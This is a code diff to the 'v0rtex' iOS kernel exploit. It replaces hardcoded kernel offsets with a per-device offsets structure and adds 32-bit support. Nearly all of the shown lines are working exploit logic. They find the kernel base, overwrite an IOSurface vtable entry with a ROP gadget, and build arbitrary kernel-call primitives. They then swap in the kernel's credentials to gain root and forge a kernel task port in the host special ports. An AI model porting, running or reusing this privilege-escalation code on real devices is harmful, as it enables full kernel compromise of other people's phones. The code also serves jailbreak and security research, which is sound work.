@@ -37,7 +37,9 @@
 // Not sure what'll really become of this, but it's certainly not done yet.
 // Pretty sure I'll leave iOS 11 to Ian Beer though, for the time being.
 
+#include <errno.h>              // errno
 #include <sched.h>              // sched_yield
+#include <stdlib.h>             // malloc, free
 #include <string.h>             // strerror, memset
 #include <unistd.h>             // usleep, setuid, getuid
 #include <mach/mach.h>
@@ -45,52 +47,42 @@
 #include <CoreFoundation/CoreFoundation.h>
 
 #include "common.h"             // LOG, kptr_t
+#include "offsets.h"
 #include "v0rtex.h"
 
-// ********** ********** ********** find automatically, eventually ********** ********** **********
+// ********** ********** ********** get rid of ********** ********** **********
 
-#   define SIZEOF_TASK                                  0x550
+#ifdef __LP64__
 #   define OFFSET_TASK_ITK_SELF                         0xd8
-#   define OFFSET_TASK_ITK_REGISTERED                   0x2e8
-#   define OFFSET_TASK_BSD_INFO                         0x360
-#   define OFFSET_PROC_UCRED                            0x100
-#   define OFFSET_VM_MAP_HDR                            0x10
-#   define OFFSET_IPC_SPACE_IS_TASK                     0x28
-#   define OFFSET_REALHOST_SPECIAL                      0x10
 #   define OFFSET_IOUSERCLIENT_IPC                      0x9c
-#   define OFFSET_VTAB_GET_RETAIN_COUNT                 0x3  /* in pointer-sized units */
-#   define OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX      0xb7 /* in pointer-sized units */
-    typedef struct mach_header_64 mach_hdr_t;
+#else
+#   define OFFSET_TASK_ITK_SELF                         0x9c
+#   define OFFSET_IOUSERCLIENT_IPC                      0x5c
+#endif
 
-    // iPod touch 6G (iPod7,1) 10.3.3
-#   define OFFSET_ZONE_MAP                              0xfffffff007558478 /* "zone_init: kmem_suballoc failed" */
-#   define OFFSET_KERNEL_MAP                            0xfffffff0075b4050
-#   define OFFSET_KERNEL_TASK                           0xfffffff0075b4048
-#   define OFFSET_REALHOST                              0xfffffff00753aba0 /* host_priv_self */
-#   define OFFSET_COPYIN                                0xfffffff00718d028
-#   define OFFSET_COPYOUT                               0xfffffff00718d21c
-#   define OFFSET_CHGPROCCNT                            0xfffffff00739aa04
-#   define OFFSET_KAUTH_CRED_REF                        0xfffffff007374d90
-#   define OFFSET_IPC_PORT_ALLOC_SPECIAL                0xfffffff0070a60b4 /* convert_task_suspension_token_to_port */
-#   define OFFSET_IPC_KOBJECT_SET                       0xfffffff0070b938c /* convert_task_suspension_token_to_port */
-#   define OFFSET_IPC_PORT_MAKE_SEND                    0xfffffff0070a5bd8 /* "ipc_host_init" */
-#   define OFFSET_OSSERIALIZER_SERIALIZE                0xfffffff00744db90
-#   define OFFSET_ROP_LDR_X0_X0_0x10                    0xfffffff00722a41c
+#define IOSURFACE_CREATE_OUTSIZE    0x3c8 /* XXX 0x6c8 for iOS 11.0, 0xbc8 for 11.1.2 */
 
 // ********** ********** ********** constants ********** ********** **********
 
+#ifdef __LP64__
 #   define KERNEL_MAGIC             MH_MAGIC_64
 #   define KERNEL_HEADER_OFFSET     0x4000
+#else
+#   define KERNEL_MAGIC             MH_MAGIC
+#   define KERNEL_HEADER_OFFSET     0x1000
+#endif
 
 #define KERNEL_SLIDE_STEP           0x100000
-
-#define IOSURFACE_CREATE_OUTSIZE    0x3c8 /* XXX 0x6c8 for iOS 11.0, 0xbc8 for 11.1.2 */
 
 #define NUM_BEFORE                  0x2000
 #define NUM_AFTER                   0x1000
 #define NUM_DATA                    0x4000
 #define DATA_SIZE                   0x1000
+#ifdef __LP64__
 #   define VTAB_SIZE                200
+#else
+#   define VTAB_SIZE                250
+#endif
 
 const uint64_t IOSURFACE_CREATE_SURFACE =  0;
 const uint64_t IOSURFACE_SET_VALUE      =  9;
@@ -134,7 +126,11 @@ do \
     ); \
 } while(0)
 
+#ifdef __LP64__
 #   define UNALIGNED_KPTR_DEREF(addr) (((kptr_t)*(volatile uint32_t*)(addr)) | (((kptr_t)*((volatile uint32_t*)(addr) + 1)) << 32))
+#else
+#   define UNALIGNED_KPTR_DEREF(addr) ((kptr_t)*(volatile uint32_t*)(addr))
+#endif
 
 #define VOLATILE_ZERO(addr, size) \
 do \
@@ -519,12 +515,16 @@ typedef union
             kptr_t data;
             uint32_t reserved : 24,
                      type     :  8;
+#ifdef __LP64__
             uint32_t pad;
+#endif
         } lock; // mutex lock
         uint32_t ref_count;
         uint32_t active;
         uint32_t halting;
+#ifdef __LP64__
         uint32_t pad;
+#endif
         kptr_t map;
     } a;
     struct {
@@ -535,7 +535,7 @@ typedef union
 
 // ********** ********** ********** exploit ********** ********** **********
 
-kern_return_t v0rtex(v0rtex_cb_t callback, void *cb_data)
+kern_return_t v0rtex(offsets_t *off, v0rtex_cb_t callback, void *cb_data)
 {
     kern_return_t retval = KERN_FAILURE,
                   ret = 0;
@@ -729,6 +729,7 @@ kern_return_t v0rtex(v0rtex_cb_t callback, void *cb_data)
             .data = 0x0,
             .type = 0x11,
         },
+#ifdef __LP64__
         .ip_messages =
         {
             .port =
@@ -745,6 +746,7 @@ kern_return_t v0rtex(v0rtex_cb_t callback, void *cb_data)
         },
         .ip_nsrequest = 0x0,
         .ip_pdrequest = 0x11,
+#endif
     };
     for(uintptr_t ptr = (uintptr_t)&dict[5], end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
     {
@@ -994,7 +996,7 @@ do \
     }
 
     kptr_t self_task = 0;
-    KREAD(itk_space + OFFSET_IPC_SPACE_IS_TASK, &self_task, sizeof(self_task));
+    KREAD(itk_space + off->ipc_space_is_task, &self_task, sizeof(self_task));
     LOG("self_task: " ADDR, self_task);
     if(!self_task)
     {
@@ -1002,7 +1004,7 @@ do \
     }
 
     kptr_t IOSurfaceRootUserClient_port = 0;
-    KREAD(self_task + OFFSET_TASK_ITK_REGISTERED, &IOSurfaceRootUserClient_port, sizeof(IOSurfaceRootUserClient_port));
+    KREAD(self_task + off->task_itk_registered, &IOSurfaceRootUserClient_port, sizeof(IOSurfaceRootUserClient_port));
     LOG("IOSurfaceRootUserClient port: " ADDR, IOSurfaceRootUserClient_port);
     if(!IOSurfaceRootUserClient_port)
     {
@@ -1036,7 +1038,7 @@ do \
     kptr_t vtab[VTAB_SIZE] = { 0 };
     KREAD(IOSurfaceRootUserClient_vtab, vtab, sizeof(vtab));
 
-    kptr_t kbase = (vtab[OFFSET_VTAB_GET_RETAIN_COUNT] & ~(KERNEL_SLIDE_STEP - 1)) + KERNEL_HEADER_OFFSET;
+    kptr_t kbase = (vtab[off->vtab_get_retain_count] & ~(KERNEL_SLIDE_STEP - 1)) + KERNEL_HEADER_OFFSET;
     for(uint32_t magic = 0; 1; kbase -= KERNEL_SLIDE_STEP)
     {
         KREAD(kbase, &magic, sizeof(magic));
@@ -1047,29 +1049,21 @@ do \
     }
     LOG("Kernel base: " ADDR, kbase);
 
-#ifndef XXX
-    kptr_t slide = kbase - 0xfffffff007004000;
-    LOG("Kernel slide: " ADDR, slide);
-    if((slide % 0x100000) != 0)
-    {
-        goto out;
-    }
-#endif
-
-    mach_hdr_t khdr = { 0 };
-    KREAD(kbase, &khdr, sizeof(khdr));
-
-#define OFF(name) (OFFSET_ ## name + slide)
+#define OFF(name) (off->name + (kbase - off->base))
 
     kptr_t zone_map_addr = 0;
-    KREAD(OFF(ZONE_MAP), &zone_map_addr, sizeof(zone_map_addr));
+    KREAD(OFF(zone_map), &zone_map_addr, sizeof(zone_map_addr));
     LOG("zone_map: " ADDR, zone_map_addr);
     if(!zone_map_addr)
     {
         goto out;
     }
 
-    vtab[OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX] = OFF(ROP_LDR_X0_X0_0x10);
+#ifdef __LP64__
+    vtab[off->vtab_get_external_trap_for_index] = OFF(rop_ldr_x0_x0_0x10);
+#else
+    vtab[off->vtab_get_external_trap_for_index] = OFF(rop_ldr_r0_r0_0xc);
+#endif
 
     uint32_t faketask_off = fakeport_off < sizeof(ktask_t) ? fakeport_off + sizeof(kport_t) : 0;
     faketask_off = UINT64_ALIGN(faketask_off);
@@ -1209,14 +1203,14 @@ do \
 #define KCALL_ZERO(addr, x0, x1, x2) \
 ( \
     fakeobj_buf->a.obj = fakeobj_addr + ((uintptr_t)&fakeobj_buf->a.indirect - (uintptr_t)fakeobj_buf) - 2 * sizeof(kptr_t), \
-    fakeobj_buf->a.func = OFF(OSSERIALIZER_SERIALIZE), \
+    fakeobj_buf->a.func = OFF(osserializer_serialize), \
     fakeobj_buf->a.indirect[0] = (x0), \
     fakeobj_buf->a.indirect[1] = (x1), \
     fakeobj_buf->a.indirect[2] = (addr), \
     (kptr_t)IOConnectTrap6(fakeport, 0, (kptr_t)(x2), 0, 0, 0, 0, 0) \
 )
     kptr_t kernel_task_addr = 0;
-    int r = KCALL(OFF(COPYOUT), OFF(KERNEL_TASK), &kernel_task_addr, sizeof(kernel_task_addr), 0, 0, 0, 0);
+    int r = KCALL(OFF(copyout), OFF(kernel_task), &kernel_task_addr, sizeof(kernel_task_addr), 0, 0, 0, 0);
     LOG("kernel_task addr: " ADDR ", %s, %s", kernel_task_addr, errstr(r), mach_error_string(r));
     if(r != 0 || !kernel_task_addr)
     {
@@ -1224,7 +1218,7 @@ do \
     }
 
     kptr_t kernproc_addr = 0;
-    r = KCALL(OFF(COPYOUT), kernel_task_addr + OFFSET_TASK_BSD_INFO, &kernproc_addr, sizeof(kernproc_addr), 0, 0, 0, 0);
+    r = KCALL(OFF(copyout), kernel_task_addr + off->task_bsd_info, &kernproc_addr, sizeof(kernproc_addr), 0, 0, 0, 0);
     LOG("kernproc addr: " ADDR ", %s, %s", kernproc_addr, errstr(r), mach_error_string(r));
     if(r != 0 || !kernproc_addr)
     {
@@ -1232,7 +1226,7 @@ do \
     }
 
     kptr_t kern_ucred = 0;
-    r = KCALL(OFF(COPYOUT), kernproc_addr + OFFSET_PROC_UCRED, &kern_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
+    r = KCALL(OFF(copyout), kernproc_addr + off->proc_ucred, &kern_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
     LOG("kern_ucred: " ADDR ", %s, %s", kern_ucred, errstr(r), mach_error_string(r));
     if(r != 0 || !kern_ucred)
     {
@@ -1240,7 +1234,7 @@ do \
     }
 
     kptr_t self_proc = 0;
-    r = KCALL(OFF(COPYOUT), self_task + OFFSET_TASK_BSD_INFO, &self_proc, sizeof(self_proc), 0, 0, 0, 0);
+    r = KCALL(OFF(copyout), self_task + off->task_bsd_info, &self_proc, sizeof(self_proc), 0, 0, 0, 0);
     LOG("self_proc: " ADDR ", %s, %s", self_proc, errstr(r), mach_error_string(r));
     if(r != 0 || !self_proc)
     {
@@ -1248,7 +1242,7 @@ do \
     }
 
     kptr_t self_ucred = 0;
-    r = KCALL(OFF(COPYOUT), self_proc + OFFSET_PROC_UCRED, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);
+    r = KCALL(OFF(copyout), self_proc + off->proc_ucred, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);
     LOG("self_ucred: " ADDR ", %s, %s", self_ucred, errstr(r), mach_error_string(r));
     if(r != 0 || !self_ucred)
     {
@@ -1258,8 +1252,8 @@ do \
     int olduid = getuid();
     LOG("uid: %u", olduid);
 
-    KCALL(OFF(KAUTH_CRED_REF), kern_ucred, 0, 0, 0, 0, 0, 0);
-    r = KCALL(OFF(COPYIN), &kern_ucred, self_proc + OFFSET_PROC_UCRED, sizeof(kern_ucred), 0, 0, 0, 0);
+    KCALL(OFF(kauth_cred_ref), kern_ucred, 0, 0, 0, 0, 0, 0);
+    r = KCALL(OFF(copyin), &kern_ucred, self_proc + off->proc_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
     LOG("copyin: %s", errstr(r));
     if(r != 0 || !self_ucred)
     {
@@ -1274,8 +1268,8 @@ do \
 
     if(newuid != olduid)
     {
-        KCALL_ZERO(OFF(CHGPROCCNT), newuid, 1, 0);
-        KCALL_ZERO(OFF(CHGPROCCNT), olduid, -1, 0);
+        KCALL_ZERO(OFF(chgproccnt), newuid, 1, 0);
+        KCALL_ZERO(OFF(chgproccnt), olduid, -1, 0);
     }
 
     host_t realhost = mach_host_self();
@@ -1307,7 +1301,7 @@ do \
     km_task_buf->a.ref_count = 100;
     km_task_buf->a.active = 1;
     km_task_buf->b.itk_self = 1;
-    r = KCALL(OFF(COPYOUT), OFF(KERNEL_MAP), &km_task_buf->a.map, sizeof(km_task_buf->a.map), 0, 0, 0, 0);
+    r = KCALL(OFF(copyout), OFF(kernel_map), &km_task_buf->a.map, sizeof(km_task_buf->a.map), 0, 0, 0, 0);
     LOG("kernel_map: " ADDR ", %s", km_task_buf->a.map, errstr(r));
     if(r != 0 || !km_task_buf->a.map)
     {
@@ -1315,7 +1309,7 @@ do \
     }
 
     kptr_t ipc_space_kernel = 0;
-    r = KCALL(OFF(COPYOUT), IOSurfaceRootUserClient_port + ((uintptr_t)&kport.ip_receiver - (uintptr_t)&kport), &ipc_space_kernel, sizeof(ipc_space_kernel), 0, 0, 0, 0);
+    r = KCALL(OFF(copyout), IOSurfaceRootUserClient_port + ((uintptr_t)&kport.ip_receiver - (uintptr_t)&kport), &ipc_space_kernel, sizeof(ipc_space_kernel), 0, 0, 0, 0);
     LOG("ipc_space_kernel: " ADDR ", %s", ipc_space_kernel, errstr(r));
     if(r != 0 || !ipc_space_kernel)
     {
@@ -1324,7 +1318,7 @@ do \
 
 #ifdef __LP64__
     kmap_hdr_t zm_hdr = { 0 };
-    r = KCALL(OFF(COPYOUT), zm_task_buf->a.map + OFFSET_VM_MAP_HDR, &zm_hdr, sizeof(zm_hdr), 0, 0, 0, 0);
+    r = KCALL(OFF(copyout), zm_task_buf->a.map + off->vm_map_hdr, &zm_hdr, sizeof(zm_hdr), 0, 0, 0, 0);
     LOG("zm_range: " ADDR "-" ADDR ", %s", zm_hdr.start, zm_hdr.end, errstr(r));
     if(r != 0 || !zm_hdr.start || !zm_hdr.end)
     {
@@ -1346,15 +1340,15 @@ do \
 #endif
 
     kptr_t ptrs[2] = { 0 };
-    ptrs[0] = ZM_FIX_ADDR(KCALL(OFF(IPC_PORT_ALLOC_SPECIAL), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
-    ptrs[1] = ZM_FIX_ADDR(KCALL(OFF(IPC_PORT_ALLOC_SPECIAL), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
+    ptrs[0] = ZM_FIX_ADDR(KCALL(OFF(ipc_port_alloc_special), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
+    ptrs[1] = ZM_FIX_ADDR(KCALL(OFF(ipc_port_alloc_special), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
     LOG("zm_port addr: " ADDR, ptrs[0]);
     LOG("km_port addr: " ADDR, ptrs[1]);
 
-    KCALL(OFF(IPC_KOBJECT_SET), ptrs[0], zm_task_addr, IKOT_TASK, 0, 0, 0, 0);
-    KCALL(OFF(IPC_KOBJECT_SET), ptrs[1], km_task_addr, IKOT_TASK, 0, 0, 0, 0);
+    KCALL(OFF(ipc_kobject_set), ptrs[0], zm_task_addr, IKOT_TASK, 0, 0, 0, 0);
+    KCALL(OFF(ipc_kobject_set), ptrs[1], km_task_addr, IKOT_TASK, 0, 0, 0, 0);
 
-    r = KCALL(OFF(COPYIN), ptrs, self_task + OFFSET_TASK_ITK_REGISTERED, sizeof(ptrs), 0, 0, 0, 0);
+    r = KCALL(OFF(copyin), ptrs, self_task + off->task_itk_registered, sizeof(ptrs), 0, 0, 0, 0);
     LOG("copyin: %s", errstr(r));
     if(r != 0)
     {
@@ -1375,7 +1369,7 @@ do \
     }
     // Clean out the pointers without dropping refs
     ptrs[0] = ptrs[1] = 0;
-    r = KCALL(OFF(COPYIN), ptrs, self_task + OFFSET_TASK_ITK_REGISTERED, sizeof(ptrs), 0, 0, 0, 0);
+    r = KCALL(OFF(copyin), ptrs, self_task + off->task_itk_registered, sizeof(ptrs), 0, 0, 0, 0);
     LOG("copyin: %s", errstr(r));
     if(r != 0)
     {
@@ -1383,7 +1377,7 @@ do \
     }
 
     mach_vm_address_t remap_addr = 0;
-    ret = mach_vm_remap(maps[1], &remap_addr, SIZEOF_TASK, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kernel_task_addr, false, &cur, &max, VM_INHERIT_NONE);
+    ret = mach_vm_remap(maps[1], &remap_addr, off->sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kernel_task_addr, false, &cur, &max, VM_INHERIT_NONE);
     LOG("mach_vm_remap: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
@@ -1391,18 +1385,18 @@ do \
     }
     LOG("remap_addr: 0x%016llx", remap_addr);
 
-    ret = mach_vm_wire(realhost, maps[1], remap_addr, SIZEOF_TASK, VM_PROT_READ | VM_PROT_WRITE);
+    ret = mach_vm_wire(realhost, maps[1], remap_addr, off->sizeof_task, VM_PROT_READ | VM_PROT_WRITE);
     LOG("mach_vm_wire: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
         goto out;
     }
 
-    kptr_t newport = ZM_FIX_ADDR(KCALL(OFF(IPC_PORT_ALLOC_SPECIAL), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
+    kptr_t newport = ZM_FIX_ADDR(KCALL(OFF(ipc_port_alloc_special), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
     LOG("newport: " ADDR, newport);
-    KCALL(OFF(IPC_KOBJECT_SET), newport, remap_addr, IKOT_TASK, 0, 0, 0, 0);
-    KCALL(OFF(IPC_PORT_MAKE_SEND), newport, 0, 0, 0, 0, 0, 0);
-    r = KCALL(OFF(COPYIN), &newport, OFF(REALHOST) + OFFSET_REALHOST_SPECIAL + sizeof(kptr_t) * 4, sizeof(kptr_t), 0, 0, 0, 0);
+    KCALL(OFF(ipc_kobject_set), newport, remap_addr, IKOT_TASK, 0, 0, 0, 0);
+    KCALL(OFF(ipc_port_make_send), newport, 0, 0, 0, 0, 0, 0);
+    r = KCALL(OFF(copyin), &newport, OFF(realhost) + off->realhost_special + sizeof(kptr_t) * 4, sizeof(kptr_t), 0, 0, 0, 0);
     LOG("copyin: %s", errstr(r));
     if(r != 0)
     {
